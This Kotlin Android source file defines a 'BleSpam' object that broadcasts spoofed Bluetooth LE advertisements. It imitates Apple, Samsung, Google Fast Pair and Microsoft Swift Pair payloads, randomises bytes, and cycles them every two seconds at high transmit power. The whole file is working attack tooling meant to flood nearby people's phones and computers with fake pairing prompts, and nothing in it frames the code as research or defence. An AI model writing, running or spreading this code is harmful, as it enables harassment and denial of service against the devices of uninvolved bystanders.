package com.twks.wifi

import android.Manifest
import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.ParcelUuid
import kotlinx.coroutines.*
import kotlin.random.Random

object BleSpam {
    @Volatile var status: String = "IDLE"
    @Volatile private var running = false
    private var advertiser: BluetoothLeAdvertiser? = null
    private var job: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cb = object : AdvertiseCallback() {}

    private fun man(company: Int, data: ByteArray): AdvertiseData =
        AdvertiseData.Builder().addManufacturerData(company, data).build()

    private fun svcFull(uuid: String, data: ByteArray): AdvertiseData =
        AdvertiseData.Builder()
            .addServiceUuid(ParcelUuid.fromString(uuid))
            .addServiceData(ParcelUuid.fromString(uuid), data)
            .build()

    private fun rnd(n: Int): ByteArray {
        val b = ByteArray(n)
        Random.nextBytes(b)
        return b
    }

    private fun apple() = listOf(
        man(0x004C, byteArrayOf(0x07,0x19,0x07,0x02,0x20,0x75,0xAA.toByte(),0x30,0x01,0x00,0x00,0x45)),
        man(0x004C, byteArrayOf(0x12,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)),
        man(0x004C, byteArrayOf(0x0C,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)),
        man(0x004C, byteArrayOf(0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    )

    private fun androidPool() = listOf(
        svcFull("0000fe2c-0000-1000-8000-00805f9b34fb", byteArrayOf(0x00) + rnd(3) + rnd(6)),
        svcFull("0000fe2c-0000-1000-8000-00805f9b34fb", byteArrayOf(0x01) + rnd(3) + rnd(8))
    )

    private fun samsung() = listOf(
        man(0x0075, byteArrayOf(0x00,0x01,0x00,0x02,0x00,0x07,0xFF.toByte(),0x00) + rnd(4)),
        man(0x0075, byteArrayOf(0x01,0x00,0x02,0x00,0x07,0xFF.toByte(),0x00) + rnd(5)),
        man(0x0075, rnd(7))
    )

    private fun windows() = listOf(
        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(8)),
        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(5))
    )

    @SuppressLint("MissingPermission")
    fun start(ctx: Context, mode: Int) {
        if (running) return
        val bm = ctx.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = bm?.adapter
        if (adapter == null) { status = "NO BT ADAPTER"; return }
        if (!adapter.isEnabled) { status = "BT OFF — включи bluetooth"; return }
        if (Build.VERSION.SDK_INT >= 31 &&
            ctx.checkSelfPermission(Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED
        ) { status = "NO ADVERTISE PERM"; return }
        advertiser = adapter.bluetoothLeAdvertiser
        if (advertiser == null) { status = "ADVERTISER UNSUPPORTED"; return }

        running = true
        status = "STARTING"
        val pool = when (mode) {
            0 -> apple()
            1 -> androidPool()
            2 -> samsung()
            3 -> windows()
            else -> apple() + androidPool() + samsung() + windows()
        }
        job = scope.launch {
            var i = 0
            while (running && isActive) {
                val data = pool[i % pool.size]
                try { advertiser?.stopAdvertising(cb) } catch (e: Exception) {}
                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .build()
                try {
                    advertiser?.startAdvertising(settings, data, cb)
                    status = "ADV STARTED · cycle $i/${pool.size}"
                } catch (e: Exception) {
                    status = "EXC: ${e.message}"
                }
                i++
                delay(2000)
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun stop() {
        running = false
        job?.cancel()
        try { advertiser?.stopAdvertising(cb) } catch (e: Exception) {}
        status = "IDLE"
    }

    fun isRunning() = running
}
